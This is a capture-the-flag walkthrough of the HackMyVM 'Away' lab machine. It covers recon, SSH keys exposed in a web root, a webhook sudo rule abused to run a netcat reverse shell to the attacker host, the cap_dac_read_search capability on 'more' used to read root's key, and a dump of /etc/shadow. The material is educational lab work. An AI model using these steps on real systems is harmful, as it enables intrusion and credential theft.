---
title: CTF Walkthrough for HackMyVM Machine Away
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Capabilities]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-22-away/box-away.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Away a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Away<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Away](https://downloads.hackmyvm.eu/away.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>

## Reconnaissance
 As usual we first start with a host discivery scan on the current sbnet to identify our target on the network.
```bash
┌──(pentester㉿kali)-[~/Away]
└─$nmap -sn -n 10.0.2.16/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 13:16 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00033s latency).
Nmap scan report for 10.0.2.25
Host is up (0.00082s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.43 seconds
```

Now that we know our target IP address we can perform a service enumeration on the target to identify services running on open ports.
```bash
┌──(pentester㉿kali)-[~/Away/Scans/Service]
└─$nmap -sV -sC  10.0.2.25 -n -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 13:17 BST
Nmap scan report for 10.0.2.25
Host is up (0.0011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 f1:87:03:41:21:12:ef:80:3c:8f:07:2f:8b:3c:6e:2a (RSA)
|   256 5f:f9:ca:19:0d:74:65:2c:97:4a:36:a4:04:7c:9b:bd (ECDSA)
|_  256 39:a4:b3:38:94:c5:d2:77:07:a1:dd:b4:2f:0a:5a:44 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

Our target appears to run an SSH and an Nginx web server. Let's browse the web application to understand its functioning.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-22-away/1-browse.png)

This page appears to have the same output format we see when we generate SSH keys but in this case, we see  *ED25519 256* instead of *RSA 3072*. Since RSA is an encryption algorithm we could deduce that ED25519 is also one. It looks like the administrator has generated SSH keys in this directory and stored the output of the command. According to our assumption, if the administrator allowed both the command's output and the keys in the web root directory, we will be able to retrieve both the public and private keys as we did we the command output. To do this, we first need to know how the files using this are called by default. Let's generate a key pair on our attack host.
```bash
┌──(pentester㉿kali)-[~/Away/Misc Files]
└─$ ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
<SNIP>
+--[ED25519 256]--+
|          o ..oo |
|   .     . *..o  |
|    +   . +oo+.  |
|   + . .  o+.oo  |
|  . . o S.o O..  |
|     o . . @E* . |
|      o . + = +  |
|       o  o.+=.  |
|        .. ++B+  |
+----[SHA256]-----+

┌──(pentester㉿kali)-[~/Away/Misc Files]
└─$ls -la
<SNIP>
-rw-------  1 pentester pentester  411 Sep 22 19:30 id_ed25519
-rw-r--r--  1 pentester pentester   98 Sep 22 19:30 id_ed25519.pub
```

From the output of the command above, we see that the default name for the private key is id_ed25519 and that of the public key is id_ed25519.pub. Let's use to name to check if the administrator has forgotten to delete these files in the we's root directory.
```bash
┌──(pentester㉿kali)-[~/Away/Misc File]
└─$curl http://10.0.2.25/id_ed25519.pub         

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTsYR6Gg1apA+kuSgdtTkrrhhgskSJf  My passphrase is: <REDACTED>

┌──(pentester㉿kali)-[~/Away/Misc File]
└─$curl http://10.0.2.25/id_ed25519

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA+GY+qad
MDkU/yMHam3bmdAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIpBfnwSG2XZXFTs
YR6Gg1apA+kuSgdtTkrrhhgskSJfAAAAsAEbt6fRUQfkYGDCdAa/zOBpiUuAV1kGiDs3F1
gD8y+UxeRdz6gQxbHAY53rE25YN+t1bml5GuNMx99CLApAQCMgeePifFV+t2gRnaMEGRnf
4u1RfM20X6rRYdKeQKHwrE5b/m4xgKC5FvKfiGESqirQ2XPWZnOfbcNc+czsut8t8v+zfl
kYo1mO1M4Va9i+OipgnoOJkdNB+mdx2f7YE0lWoHdt/7KVG5eDB90WrJZF
-----END OPENSSH PRIVATE KEY-----
```

We see that both the public and private keys are still present in the web's root directory and that the public key contains a passphrase. Let's download the private key and attempt to connect with the username we saw above on the index page.
```bash
┌──(pentester㉿kali)-[~/Away/Misc File]
└─$ chmod 600 id_ed25519
┌──(pentester㉿kali)-[~/Away/Misc File]
└─$ ssh tula@10.0.2.25 -i id_ed25519     

Enter passphrase for key 'id_ed25519': 

Linux away 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64

<SNIP>
Last login: Fri Jun 17 10:28:31 2022 from 192.168.1.51

tula@away:~$ ls
user.txt
```
We successfully connected as the user Tula and even though the private key was protected by a passphrase this passphrase was the passphrase present in the public key we saw above.

## Post Exploitation

Now that we have a foothold on the target we can start our enumeration steps. Simple methods can be to look for all files having special capabilities and also for the sudo rights of our current user.
```bash
tula@away:~$ /usr/sbin/getcap / -r 2>/dev/null
/usr/bin/more cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep

tula@away:~$ ls -l /usr/bin/more 
-rwxrwx--- 1 root lula 59632 ene 20  2022 /usr/bin/more

tula@away:~$ sudo -l
Matching Defaults entries for tula on away:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tula may run the following commands on away:
    (lula) NOPASSWD: /usr/bin/webhook
```

From the result above, we can see that the /usr/bin/more binary has the [cap_dac_read_search](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search) capability. Unfortunately, we cannot execute this binary as we do not have permission to do so. Also, we can see that the user Tula can execute the /usr/bin/webhook as the user Lula. This binary looks new to us and has no entry in GTFOBins. A quick Google search reveals that [webhook](https://github.com/adnanh/webhook) is a tool available on GitHub and it is used to create HTTP endpoints on a server to execute configured commands. 
![](/assets/img/posts/walthrough/hackmyvm/2024-09-22-away/webhook-info.png)

Since we can run this tool as the user Lula, we can create an endpoint that will execute a reverse shell command to gain access to the system as Lula. Let's follow the instructions on the [README.md](https://github.com/adnanh/webhook/blob/master/README.md) page of this tool on GitHub. First, we start by creating a configuration file that contains the name of our endpoint and the name of the files containing the configured commands.
```bash
tula@away:/tmp$ nano hooks.json
tula@away:/tmp$ cat hooks.json 
[
  {
    "id": "reverse-shell",
    "execute-command": "/tmp/reverse_shell.sh",
    "command-working-directory": "/tmp"
  }
]
```
Next, we would like to create that file by placing a reverse shell payload in the file.
```bash
tula@away:/tmp$ nano reverse_shell.sh
tula@away:/tmp$ chmod 755 reverse_shell.sh
tula@away:/tmp$ cat reverse_shell.sh 
#!/bin/sh
nc -c bash 10.0.2.16 8000
```

Now we can start the HTTP endpoint as the user Lula using the sudo command.
```bash
tula@away:/tmp$ sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose
[webhook] 2024/09/22 00:40:14 version 2.6.9 starting
[webhook] 2024/09/22 00:40:14 setting up os signal watcher
[webhook] 2024/09/22 00:40:14 attempting to load hooks from hooks.json
[webhook] 2024/09/22 00:40:14 os signal watcher ready
[webhook] 2024/09/22 00:40:14 found 1 hook(s) in file
[webhook] 2024/09/22 00:40:14   loaded: reverse-shell
[webhook] 2024/09/22 00:40:14 serving hooks on http://0.0.0.0:9000/hooks/{id}
```

For our file containing the revere shell to be executed, we need to access the endpoint. But before this, we need to start a listener on our attack host to receive the connection from the target.
```bash
┌──(pentester㉿kali)-[~/Away]
└─$nc -lvnp 8000
listening on [any] 8000 ...
```

After starting our listener, we can access the endpoint on port 9000 of our target by using the endpoint's name we specified in the configuration file to trigger our payload.
```bash
┌──(pentester㉿kali)-[~/Away]
└─$curl http://10.0.2.25:9000/hooks/reverse-shell
```

If we go back to our listener we will notice a reverse connection from our target. We can upgrade this shell to obtain a fully interactive shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Away]
└─$nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.25] 38900
whereis python
python: /usr/bin/python3.9 /usr/lib/python2.7 /usr/lib/python3.9 /etc/python3.9 /usr/local/lib/python3.9
python3 -c 'import pty;pty.spawn("/bin/bash")'
lula@away:/tmp$ ^Z
zsh: suspended  nc -lvnp 8000

┌──(pentester㉿kali)-[~/Away]
└─$stty raw -echo;fg
[1]  + continued  nc -lvnp 8000
                               export TERM=xterm
lula@away:/tmp$ 
```

The webhook executable runed our payload without any  problem and now we have access to the system as Lula. Remember above that we enumerated the system and noticed that the /usr/bin/more binary had the [cap_dac_read_search](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search) capability. The cap_dac_read_search capability enables a process to bypass permissions for reading files and for reading and executing directories. We can use this capability to read the root's private SSH keys. 
```bash
lula@away:~$ /usr/bin/more /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCZsnRA543yhxJSmFw8Nc2vT6umh4rqVRA5RwgKbTm/SAAAAJB3Fxg4dxcY
OAAAAAtzc2gtZWQyNTUxOQAAACCZsnRA543yhxJSmFw8Nc2vT6umh4rqVRA5RwgKbTm/SA
AAAECDZ5NtdbnBm8jUAAdwpKe3m6amsmnVy+AS2qRite6MpZmydEDnjfKHElKYXDw1za9P
q6aHiupVEDlHCAptOb9IAAAACXJvb3RAYXdheQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

We can save this key to a file and attempt to connect to the system as the root user.
```bash
┌──(pentester㉿kali)-[~/Away/Misc File]
└─$nano root_id_ed25519
   
┌──(pentester㉿kali)-[~/Away/Misc File]
└─$chmod 600 root_id_ed25519 

┌──(pentester㉿kali)-[~/Away/Misc File]
└─$ssh root@10.0.2.25 -i root_id_ed25519

Linux away 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64
<SNIP>
Last login: Fri Jun 17 11:14:38 2022
root@away:~# ls
ro0t.txt
```

Great! With this access, we own the system and we can read the flag. In a real-life assessment, we would like to read the /etc/shadow file to crack the hashes locally and give the result to our client.
```bash
root@away:~# cat /etc/shadow
root:$y$j9T$qYZYJX/wILbtoidT.wkrH0$Wn1sOkp/3PSAgW.qg.2WFf2ymerT4a0XXs9J0ct.1KA:19160:0:99999:7:::
<SNIP>
tula:$y$j9T$ZXiZbivLBjAJC.d/HDw2//$U.QeXUD43nxmixaToOBOXnSvJc6N3nqjWHRgZt5hoG4:19160:0:99999:7:::
systemd-coredump:!*:19160::::::
lula:$y$j9T$1SLgAZHAKLSQVNHY2kT4N1$UrpSfhqN8Dkh4f3OeexUu28PDTj3QpHc5/QDEA8LOA9:19160:0:99999:7:::
```

## Conclusion

Congratulations! In this walkthrough, you've skillfully navigated a sensitive data exposure vulnerability to uncover a user’s SSH private key. Ultimately, you capitalised on the target's misconfigurations to elevate your privileges to root on the system. This machine serves as a poignant reminder of how the careless storage of sensitive files can profoundly impact an organisation’s security posture. Thank you for following up on this walkthrough.
